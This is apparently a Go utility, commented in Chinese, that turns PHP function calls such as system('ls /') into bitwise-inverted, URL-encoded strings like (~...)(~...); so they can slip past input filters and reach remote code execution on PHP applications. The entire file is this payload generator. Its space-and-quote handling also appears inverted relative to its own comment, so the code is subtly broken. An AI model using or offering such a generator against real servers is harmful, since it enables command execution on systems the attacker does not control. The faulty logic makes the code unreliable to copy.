package rcepay

import (
	"net/url"
	"regexp"
	"strings"
)

func HaveRce(payload string) string {
	regex := regexp.MustCompile(`[\(\)]`)
	if regex.MatchString(payload) { //判断是否为函数 存在 ()
		pattern1 := `([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\(`
		pattern2 := `\((.*)\)`
		regExp, _ := regexp.Compile(pattern1)  //编写正则
		regExp2, _ := regexp.Compile(pattern2) //编写正则
		function := regExp.FindAllStringSubmatch(payload, -1)
		command := regExp2.FindAllStringSubmatch(payload, -1)
		result1 := make([]string, len(function))
		result2 := make([]string, len(command))
		for i, match := range function {
			result1[i] = match[1]

		}
		for i, match := range command {
			result2[i] = match[1]
		}

		function1, command1 := result1[0], result2[0]
		function1 = qufan(function1)
		command1 = qufan(command1)
		result3 := kongge(function1, command1)
		return result3
	} else { //没有就是对字符串的正常取反
		function2 := "(~" + urlencode(qufan(payload)) + ")"
		return function2
	}
}

func urlencode(str string) string { //url编码
	return url.QueryEscape(str)
}

func qufan(payload string) string {
	bytes := []byte(payload)
	for key, _ := range bytes {
		bytes[key] = ^bytes[key] //对比特取反
	}
	result := string(bytes)
	return result
}

func kongge(payload string, payload2 string) string {
	if isSpace(payload2) {
		result3 := "(~" + urlencode(payload) + ")(~" + urlencode(payload2) + ");" //如果没有空格 我们就不需要加引号
		return result3
	} else {
		result3 := "(~" + urlencode(payload) + ")(~" + urlencode(qufan("\"")+payload2+qufan("\"")) + ");" //有的话就需要编码引号 类似 system('ls /');
		return result3
	}
}

func isSpace(s string) bool { //判断是否存在空格
	return strings.ContainsRune(s, ' ')
}
